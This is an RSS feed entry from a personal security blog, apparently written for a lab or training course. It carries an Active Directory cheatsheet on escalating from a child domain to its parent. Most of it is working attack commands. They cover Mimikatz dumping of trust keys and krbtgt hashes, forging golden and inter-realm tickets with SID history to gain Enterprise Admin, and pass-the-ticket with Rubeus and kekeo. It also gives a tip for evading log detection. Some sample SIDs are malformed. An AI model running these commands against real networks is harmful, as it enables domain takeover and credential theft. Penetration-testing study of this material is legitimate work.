@@ -1,0 +1,162 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Trusts | Giovanni Pecoraro</title><link>https://www.peco602.com/tag/trusts/</link><atom:link href="https://www.peco602.com/tag/trusts/index.xml" rel="self" type="application/rss+xml"/><description>Trusts</description><generator>Wowchemy (https://wowchemy.com)</generator><language>en-us</language><lastBuildDate>Thu, 08 Sep 2022 00:00:00 +0000</lastBuildDate><image><url>https://www.peco602.com/media/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_512x512_fill_lanczos_center_3.png</url><title>Trusts</title><link>https://www.peco602.com/tag/trusts/</link></image><item><title>Across Domain Trusts Cheatsheet</title><link>https://www.peco602.com/post/0050-across-domain-trusts-cheatsheet/</link><pubDate>Thu, 08 Sep 2022 00:00:00 +0000</pubDate><guid>https://www.peco602.com/post/0050-across-domain-trusts-cheatsheet/</guid><description>&lt;p>Domains in same forest have an implicit two-way trust with other domains. There is a trust key between the parent and child domains. There are two ways of escalating privileges between two domains of same forest:&lt;/p>
+&lt;ul>
+&lt;li>Krbtgt hash&lt;/li>
+&lt;li>Trust Tickets&lt;/li>
+&lt;/ul>
+&lt;h2 id="child-to-parent-using-trust-tickets">Child to Parent using Trust Tickets&lt;/h2>
+&lt;ol>
+&lt;li>Look for [In] trust key from child to parent:&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;lsadump::trust /patch&amp;#34;&amp;#39;&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;cyberlab-dc.cyberlab.cybercorp.local&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;lsadump::dcsync /user:cyberlab\cybercorp$&amp;#34;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
+&lt;li>An inter-realm TGT can be forged:&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;Kerberos::golden /user:[USER] /domain:[CURRENT_DOMAIN_FQDN] /sid:[CURRENT_DOMAIN_SID] /sids:[ENTERPRISE_ADMINS_GROUP_SID] /rc4:[TRUST_KEY_NTLM] /service:krbtgt /target:[PARENT_DOMAIN_FQDN] /ticket:[TICKET_EXPORT_PATH]&amp;#34;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;Kerberos::golden /user:Administrator /domain:cyberlab.cybercorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-15-21-280534878-1496970234-700767426-519 /rc4:7ef5be456dc8d7450fb8f5f7348746c5 /service:krbtgt /target:cybercorp.local /ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi&amp;#34;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>Parameter&lt;/th>
+&lt;th>Optional&lt;/th>
+&lt;th>Description&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>&lt;strong>/user&lt;/strong>&lt;/td>
+&lt;td>No&lt;/td>
+&lt;td>Username to impersonate&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&lt;strong>/domain&lt;/strong>&lt;/td>
+&lt;td>No&lt;/td>
+&lt;td>Domain FQDN&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&lt;strong>/sid&lt;/strong>&lt;/td>
+&lt;td>No&lt;/td>
+&lt;td>SID of the current domain&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&lt;strong>/sids&lt;/strong>&lt;/td>
+&lt;td>No&lt;/td>
+&lt;td>SID of the enterprise admins group of the parent domain&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&lt;strong>/rc4&lt;/strong>&lt;/td>
+&lt;td>No&lt;/td>
+&lt;td>NTLM (RC4) hash of the trust key account. Use &lt;strong>/aes128&lt;/strong> and &lt;strong>/aes256&lt;/strong> for using AES keys&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&lt;strong>/target&lt;/strong>&lt;/td>
+&lt;td>No&lt;/td>
+&lt;td>Target server FQDN&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&lt;strong>/service&lt;/strong>&lt;/td>
+&lt;td>No&lt;/td>
+&lt;td>Target service in the parent domain (krbtgt)&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>/id&lt;/td>
+&lt;td>Yes&lt;/td>
+&lt;td>User RID (default 500)&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>/groups&lt;/td>
+&lt;td>Yes&lt;/td>
+&lt;td>Group RID (default 513 512 520 518 519)&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>/startoffset&lt;/td>
+&lt;td>Yes&lt;/td>
+&lt;td>When the ticket is available (default 0 - right now) in minutes. Use negative for a ticket available from past and a larger number for future&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>/endin&lt;/td>
+&lt;td>Yes&lt;/td>
+&lt;td>Optional ticket lifetime (default is 10 years) in minutes. The default AD setting is 10 hours = 600 minutes&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>/renewmax&lt;/td>
+&lt;td>Yes&lt;/td>
+&lt;td>Ticket lifetime with renewal (default is 10 years) in minutes. The default AD setting is 7 days = 100800&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>/ptt&lt;/td>
+&lt;td>&lt;/td>
+&lt;td>Injects the ticket into the current PowerShell process (no need to save the ticket on disk)&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>&lt;strong>/ticket&lt;/strong>&lt;/td>
+&lt;td>&lt;/td>
+&lt;td>Saves the ticket to a file for later use&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;ol start="3">
+&lt;li>Get a TGS for a service (e.g. CIFS) in the target domain by using the forged trust ticket. Tickets for other services (like HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting and WinRM) can be created as well:&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># asktgs.exe &lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.\&lt;/span>&lt;span class="n">asktgs&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">AD&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Tools&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">kekeo_old&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">trust_tkt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">kirbi&lt;/span> &lt;span class="n">CIFS&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="nb">cybercorp-dc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cybercorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">local&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="4">
+&lt;li>Use the TGS to access the targeted service (may need to use it twice).&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># kirbikator.exe&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.\&lt;/span>&lt;span class="n">kirbikator&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">lsa&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">CIFS&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">cybercorp-dc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cybercorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">local&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">kirbi&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="5">
+&lt;li>Access the file share on the parent domain DC:&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">ls &lt;/span>&lt;span class="p">\\&lt;/span>&lt;span class="nb">cybercorp-dc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cybercorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">local&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">$&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Alternatively, it is possible to use &lt;code>Kekeo&lt;/code> to ask for the TGS:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="p">.\&lt;/span>&lt;span class="n">Rubeus&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">asktgs&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">ticket&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">AD&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Tools&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">kekeo_old&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">trust_tkt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">kirbi&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">service&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">CIFS&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="nb">cybercorp-dc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cybercorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">local&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">dc&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="nb">cybercorp-dc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cybercorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">local&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">ptt&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="child-to-parent-using-krbtgt-hash">Child to Parent using krbtgt hash&lt;/h2>
+&lt;ol>
+&lt;li>Look for krbtgt hash:&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;lsadump::lsa /patch&amp;#34;&amp;#39;&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;cyberlab-dc.cyberlab.cybercorp.local&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
+&lt;li>Generate a Golden Ticket forcing the SID History parameter. We will abuse SID history once again. The mimkatz option &amp;ldquo;/sids&amp;rdquo; is forcefully setting the SID History for the Enterprise Admin group for cyberlab.cybercorp.local that is the Forest Enterprise Admin Group:&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::golden /user:Administrator /domain:[CURRENT_DOMAIN_FQDN] /sid:[CURRENT_DOMAIN_SID] /sids:[ENTERPRISE_ADMINS_GROUP_SID] /krbtgt:[KRBTGT_NTLM_HASH] /ticket:[TICKET_EXPORT_PATH]&amp;#34;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::golden /user:Administrator /domain:cyberlab.cybercorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-15-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi&amp;#34;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
+&lt;li>Pass the ticket to the current session on any machine of the current domain:&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi&amp;#34;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="4">
+&lt;li>Now, it is possible to access to machine services in the forest root domain:&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">ls &lt;/span>&lt;span class="p">\\&lt;/span>&lt;span class="nb">cybercorp-dc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cybercorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">local&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">$&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">gwmi &lt;/span>&lt;span class="n">-class&lt;/span> &lt;span class="n">win32_operatingsystem&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="nb">cybercorp-dc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cybercorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">local&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>In order to avoid suspicious logs, impersonate Domain Controller account add to the SID History the SIDs of parent Domain Controllers group and Enterprise Domain Controllers group and set the group to 516 (Enterprise Admins group).&lt;/p>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>Group&lt;/th>
+&lt;th>SID&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>Domain Controllers&lt;/td>
+&lt;td>S-1-5-21-[DOMAIN_ID]-516&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>Enterprise Domain Controllers&lt;/td>
+&lt;td>S-1-5-9&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::golden /user:[DC_NAME]$ /domain:[CURRENT_DOMAIN_FQDN] /sid:[CURRENT_DOMAIN_SID] /groups:516 /sids:[PARENT_DOMAIN_CONTROLLERS_GROUP_SID],[ENTERPRISE_DOMAIN_CONTROLLERS_GROUP_SID] /krbtgt:[KRBTGT_HASH] /ptt&amp;#34;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::golden /user:dc$ /domain:cyberlab.cybercorp.local /sid:S-1-5-211874506631-3219952063-538504511 /groups:516 /sids:S-1-521-280534878-1496970234-700767426-516,S-1-5-9 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ptt&amp;#34;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr></description></item></channel></rss>
